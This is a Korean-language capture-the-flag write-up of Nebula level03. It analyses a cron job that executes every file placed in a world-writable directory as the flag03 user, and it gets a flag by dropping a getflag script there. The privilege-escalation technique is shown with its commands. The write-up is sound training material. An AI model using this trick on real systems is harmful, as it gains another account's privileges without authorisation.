# Plot

## About

Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

## 기초 조사

문제에서 지시한대로 `flag03`의 홈 디렉토리에 가보면 `writable.sh`이란 이름의 쉘 스크립트와 `writable.d`란 디렉토리가 있다. `writable.sh`가 `flag03`의 권한을 가지고 있으니 저걸 어떻게 이용하면 될 것 같다.

```sh
level03@nebula:/home/flag03$ ls -al
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

## 쉘 스크립트 분석

```bash
for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

1. `/home/flag03/writable.d` 디렉토리에 있는 파일들을 iterate 한다.
2. `ulimit -t 5`로 cpu time을 5초로 줄인다.
3. `bash -x`로 파일에 들어있는 내용을 실행한다. `-x` 옵션은 각 단계를 `trace`할 수 있게 해주는 옵션이다.
4. 3번을 마쳤으면 파일을 삭제한다.
5. 반복한다.

`writable.d`에 `/bin/sh`을 담은 파일을 추가하고 실행하면 쉘이 뜨긴 하는데 권한은 `level03` 그대로 유지 된다. 어떻게 해야 될까?

## 자동으로 실행되는 `writable.sh`

[참고한 풀이 방법](https://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level03/)

```bash
level03@nebula:/home/flag03/writable.d$ getflag
getflag is executing on a non-flag account, this doesn't count
level03@nebula:/home/flag03/writable.d$ cat ~/getflag.sh
#!/bin/sh

/bin/getflag >> /tmp/flag03.out
level03@nebula:/home/flag03/writable.d$ cp ~/getflag.sh .
level03@nebula:/home/flag03/writable.d$ ls
getflag.sh
level03@nebula:/home/flag03/writable.d$ ls
level03@nebula:/home/flag03/writable.d$ cat /tmp/flag03.out
You have successfully executed getflag on a target account
```

문제를 푸는 계정인 `level03`은 따로 cron이 설정되어 있지 않고, `flag03` 계정에는 `writable.sh`를 cron으로 몇분에 한번씩 실행을 한다. `writable.d` 디렉토리에 `getflag`를 실행해 `/tmp/flag03.out`에 stdout을 내보내는 스크립트를 넣고 기다리면 자동으로 실행이 되고, 결과를 확인 할 수 있다.

음... 이것 보단 `flag03`의 쉘을 직접 가져오고 싶은데... 더 해봐야 겠다.